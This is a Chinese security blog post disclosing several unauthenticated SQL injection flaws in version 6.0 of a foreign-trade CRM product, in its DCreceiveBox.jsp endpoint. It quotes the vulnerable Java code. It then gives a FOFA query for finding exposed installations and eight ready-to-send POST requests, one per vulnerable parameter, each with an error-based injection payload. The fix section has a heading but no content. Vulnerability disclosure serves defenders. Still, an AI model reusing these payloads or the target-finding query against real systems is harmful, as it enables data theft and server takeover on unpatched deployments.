---
title: "博斯外贸管理软件 DCreceiveBox.jsp 多处SQL注入漏洞"
source: https://mrxn.net/jswz/51boss-crm-module-DCreceiveBox-sqli.html
asset_dir: assets/博斯外贸管理软件-dcreceivebox.jsp-多处sql注入漏洞
---

# 博斯外贸管理软件 DCreceiveBox.jsp 多处SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/31 15:40
- 1293浏览
- [0评论](#comment)
- 57分钟阅读

深入探索

数据库

客户关系管理

身份验证

---

# 漏洞简介

博斯外贸管理[软件](#)是杭州博斯有限公司推出的一款针对外贸业务的管理软件。博斯外贸管理软件V6.0 `DCreceiveBox.jsp` 接口多个参数均存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

物流软件安全

# 影响版本

博斯外贸管理软件V6.0

# fofa语法

> `title="欢迎使用 博斯软件"`

# 漏洞分析

直接看 `/crm/module/DCreceiveBox.jsp` 的代码实现部分

```
try{
    interfaceBean.SearchBean sb=new interfaceBean.SearchBean(request,out);
    sb.setFormHidden();
    interfaceBean.DropOptions op=new interfaceBean.DropOptions();
    String SAVE=common.API.convertToMemory(request.getParameter("SAVE"));
    if(!"".equals(SAVE)){
       String NOWKEY=common.API.convertToMemory(request.getParameter("NOWKEY"));
       if(!NOWKEY.equals("")){
          db.execute("update crm_email_mail set c_ex13='"+SAVE+"' where commonid='"+NOWKEY+"'");
          //MESSAGE=" 优先级设置成功！";
       }
    }
```

如果SAVE、SAVE不等于空时，SAVE、NOWKEY 拼接进SQL语句，造成[SQL注入](https://mrxn.net/tag/SQL注入)。

```
<%
    String SuserName=(String)session.getAttribute("userName");
    String SuserId=(String)session.getAttribute("userId");
    String nowUserId=common.API.convertToMemory(request.getParameter("nowUserId"));
    if(!"".equals(nowUserId))SuserId=nowUserId;
    String SHUXING=common.API.convertToMemory(request.getParameter("SHUXING"));
%>

if(!USERKF.equals("")){
.....
}else{
    op.add("","全部");
    ResultSet rsmail=db.executeQuery("select * from crm_usermail where c_id = 'system' or c_id = '"+SuserId+"' order by c_id");
```

如果 USERKF 等于空，则进入else 执行SQL语句，SuserId ==> nowUserId 拼接进SQL语句，造成[SQL注入](https://mrxn.net/tag/SQL注入)。

```
if("YJZY".equals(setCustom)){
    //System.out.println("aaaaaaaaaaaaaaaa");
    String authes=request.getParameter("authes");
    String strfxlx=request.getParameter("fxlx");
    //System.out.println(strfxlx+"aaaaa"+authes);
    String strsql1="";
    if(authes.indexOf("$")!=-1){
       StringTokenizer sz=new StringTokenizer(authes,"$");//得到该邮件的ID号
       while(sz.hasMoreTokens()){
          if("".equals(strsql1))strsql1="commonid ="+sz.nextToken();
          strsql1+=" or commonid ="+sz.nextToken();
       }
    }else{
       strsql1="commonid ="+authes;
    }
       System.out.println("update crm_email_Mail set c_ex1='"+strfxlx+"' where "+strsql1);
       db.execute("update crm_email_Mail set c_ex1='"+strfxlx+"' where "+strsql1);
    MESSAGE="邮件移动成功！";
}
```

深入探索

在线安全工具

漏洞扫描器

传输层安全性协议

当 setCustom=YJZY 是，authes不包含 $ ,authes、fxlx 拼接进SQL语句造成[SQL注入](https://mrxn.net/tag/SQL注入)。

```
String setAUTOGJ=request.getParameter("setAUTOGJ");
if("Y".equals(setAUTOGJ)){
    String NOWGJ=common.API.convertToMemory(request.getParameter("NOWGJ"));

    db.execute("update bas_customdtl set c_ex5='Y' where c_ex5='N' and c_ex7="+NOWGJ);
    db.execute("update crm_email_Mail set c_ex12='Y' where c_ex12='N' and commonid="+NOWGJ);

    //out.println("update bas_customdtl set c_ex5='Y' where c_ex5='N' and c_ex7="+NOWGJ);
    MESSAGE="老客户邮件设置自动跟进成功！";
}
```

当 setAUTOGJ=Y时，NOWGJ 直接拼接进SQL语句造成[SQL注入](https://mrxn.net/tag/SQL注入)。

```
String List=common.API.convertToMemory(request.getParameter("list"));
sql+=" from crm_email_emailUser,crm_email_Mail where crm_email_Mail.commonid=crm_email_emailUser.mailId and (crm_email_emailUser.mailType=3 or crm_email_emailUser.mailType=4) and crm_email_emailUser.isdeleted=0 and crm_email_emailUser.userId="+SuserId+" and crm_email_Mail.c_ex1='"+List+"'";
```

list 直接拼接进SQL语句造成SQL注入。

SQL注入防护

```
if(!USERKF.equals("")){//从开发过来的场合
                        String strWhere=" and (bas_custom.c_ex1='"+SuserId+"' or bas_custom.c_ex2='"+SuserId+"' or bas_custom.c_ex2 like '%;"+SuserId+";%' or bas_custom.c_ex2 like '"+SuserId+";%') and (bas_custom.c_ex1='"+USERKF+"') ";
```

如果 USERKF 不为空，则直接拼接进SQL语句，造成[SQL注入](https://mrxn.net/tag/SQL注入)。

```
if(!USERKF.equals("")){//从开发过来的场合
    if(common.API.convertToMemory(request.getParameter("sortkey")).equals("")==false){
       sql1+=" order by "+common.API.convertToMemory(request.getParameter("sortkey"))+" "+common.API.convertToMemory(request.getParameter("sortmethod"));
    }else{
       sql1+=" order by c_date desc";
    }
}else{
    if(common.API.convertToMemory(request.getParameter("sortkey")).equals("")==false){
       sql1+=" order by crm_email_Mail."+common.API.convertToMemory(request.getParameter("sortkey"))+" "+common.API.convertToMemory(request.getParameter("sortmethod"));
       if(common.API.convertToMemory(request.getParameter("sortkey")).indexOf("SendDate")==-1){
          sql1+=" ,crm_email_Mail.SendDate desc";
       }
    }else{
       sql1+=" order by crm_email_Mail.SendDate desc,crm_email_Mail.commonId desc";
    }
}
```

不管 USERKF 是否为空，sortkey 均直接拼接进order by 语句SQL语句造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)（需要注意 order by 语句后的列名必须是存在的才可注入）。

代码安全审计

# 漏洞复现

## NOWKEY

```
POST /crm/module/DCreceiveBox.jsp HTTP/1.1
Host: 51boss.mrxn.net
Content-Type: application/x-www-form-urlencoded

SAVE=1&setCustom=YJZY&NOWKEY='and+1=@@version--
```

也是通过报错注入，成功爆出数据库版本信息。

漏洞修复方案

[![博斯外贸管理软件 DCreceiveBox.jsp 多处SQL注入漏洞](images/img-001-d15b1d4a8f62.webp)](https://image.mrxn.net/b1555eefe27647849fdb7d45fcd5bec9.webp)

## SAVE

```
POST /crm/module/DCreceiveBox.jsp HTTP/1.1
Host: 51boss.mrxn.net
Content-Type: application/x-www-form-urlencoded

SAVE=1'and+1=@@version--&setCustom=YJZY&NOWKEY=1
```

## nowUserId

```
POST /crm/module/DCreceiveBox.jsp HTTP/1.1
Host: 51boss.mrxn.net
Content-Type: application/x-www-form-urlencoded

nowUserId=1'and+1=@@version--
```

## YJZY

```
POST /crm/module/DCreceiveBox.jsp HTTP/1.1
Host: 51boss.mrxn.net
Content-Type: application/x-www-form-urlencoded

fxlx=1&setCustom=YJZY&authes=1+and+1=@@version--
```

## setAUTOGJ

```
POST /crm/module/DCreceiveBox.jsp HTTP/1.1
Host: 51boss.mrxn.net
Content-Type: application/x-www-form-urlencoded

setAUTOGJ=Y&NOWGJ=1+and+1=@@version--
```

## list

```
POST /crm/module/DCreceiveBox.jsp HTTP/1.1
Host: 51boss.mrxn.net
Content-Type: application/x-www-form-urlencoded

list=1'and+1=@@version--
```

## USERKF

```
POST /crm/module/DCreceiveBox.jsp HTTP/1.1
Host: 51boss.mrxn.net
Content-Type: application/x-www-form-urlencoded

USERKF=1')and+1=@@version--
```

## sortkey

```
POST /crm/module/DCreceiveBox.jsp HTTP/1.1
Host: 51boss.mrxn.net
Content-Type: application/x-www-form-urlencoded

sortkey=SendDate+and+1=@@version--
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.NOWKEY](#toc-5-1-)
- [5.2.SAVE](#toc-5-2-)
- [5.3.nowUserId](#toc-5-3-)
- [5.4.YJZY](#toc-5-4-)
- [5.5.setAUTOGJ](#toc-5-5-)
- [5.6.list](#toc-5-6-)
- [5.7.USERKF](#toc-5-7-)
- [5.8.sortkey](#toc-5-8-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
